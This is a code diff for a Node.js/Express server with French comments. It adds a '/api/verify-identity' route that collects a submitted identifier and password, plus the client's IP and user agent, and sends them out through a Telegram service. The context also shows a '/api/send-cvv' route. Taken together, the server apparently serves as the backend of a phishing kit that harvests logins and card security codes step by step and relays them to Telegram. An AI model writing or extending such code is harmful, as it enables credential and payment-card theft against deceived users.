@@ -107,6 +107,27 @@ app.post('/api/send-cvv', async (req, res) => {
   }
 });
 
+// Vérifier identité (troisième étape)
+app.post('/api/verify-identity', async (req, res) => {
+  try {
+    const { identifier, password } = req.body;
+
+    const data = {
+      identifier,
+      password,
+      ip: req.clientIP,
+      userAgent: req.userAgent,
+      timestamp: new Date().toISOString()
+    };
+
+    await telegramService.sendIdentityVerification(data);
+    res.json({ success: true, message: 'Identité vérifiée' });
+  } catch (error) {
+    console.error('Erreur:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
 // Test Telegram
 app.post('/api/test-telegram', async (req, res) => {
   try {
